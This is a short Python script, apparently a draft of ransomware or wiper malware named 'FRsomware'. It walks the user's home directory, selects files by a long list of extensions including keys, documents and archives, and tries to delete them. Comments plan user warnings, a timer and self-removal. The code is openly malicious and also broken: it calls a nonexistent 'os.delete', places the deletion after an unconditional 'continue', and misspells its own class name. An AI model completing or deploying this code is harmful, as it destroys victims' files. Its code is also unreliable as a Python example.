#modules
import os
import base64
import sys
#A class
class FRsomware:
	# check if it's android or windows or linux for specific function
	def ostype():
		
		#check system
		system = sys.platform
		return system
		
		#startup of all program
	def main():
		o = FRsomware.ostype()
		if o == "linux":
			FRsomware.linux()
		elif o == "windows":
			FRsomware.windows()
		
		
	#this is kind of usefull for function that are available on all os
	#a class of that
	class MainFR:
		#this generate path then pass it to delete file
		def gene_path(Undo=False):
			file_exts = [
        "php'", "html", "tar", "gz", "sql", "js", "css", "txt", "pdf", "tgz", "war", "jar", "java", "class", "ruby", "rar", "zip", "db", "7z", "doc", "xls", "properties", "xml", "jpg", "jpeg", "gif", "mov", "avi", "wmv", "mp3", "mp4", "wma", "acc", "wav", "pem", "pub", "docx", "apk", "exe", "dll", "tpl", "psd", "asp", "phtml", "aspx", "csv", "txt" ,"png"]
			sysRoot = os.path.expanduser("~")
			system = os.walk(sysRoot, topdown=True)
			for root, dir, files in system:
			         for file in files:
			             file_path = os.path.join(root, file)
			             if not file.split('.')[-1] in file_exts:
			                 continue
			                 if not Undo:
			                 	delete_file(file_path)
			                 else:
			                 		
			                 		delete_file(file_path, Undo=True)
		# generate path of files with specific extension
		
		#notify user - Timer+ Messages
		#this each laptop has a GUIb- Maybe
		def delete_file(file, Undo=False):
			if Undo == False:
				os.delete(file)
			else:
				sys.exit()
		#delete
		
		#remove itself
	class linux:
		MainFR.gene_path()
		
	class windows:
		MainFR.gene_path()
		
		
		
	
FRsomeware.main()	
	
		